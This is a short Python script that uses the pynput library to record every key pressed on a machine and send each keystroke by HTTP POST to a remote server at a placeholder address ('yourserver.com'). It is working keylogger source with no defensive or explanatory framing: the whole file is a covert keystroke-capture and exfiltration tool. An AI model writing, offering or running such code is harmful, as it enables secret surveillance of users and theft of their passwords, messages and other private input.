from pynput.keyboard import Key, Listener
import requests

# Define the URL to send data to
url = 'http://yourserver.com/path'

def on_press(key):
    # Convert the key to a string and remove quotes
    key = str(key).replace("'", "")
    data = {'key': key}

    # Send a POST request
    try:
        requests.post(url, data=data)
    except requests.exceptions.RequestException as e:
        # If there is a network problem (e.g. DNS failure, refused connection, etc)
        print(e)

with Listener(on_press=on_press) as listener:
    listener.join()
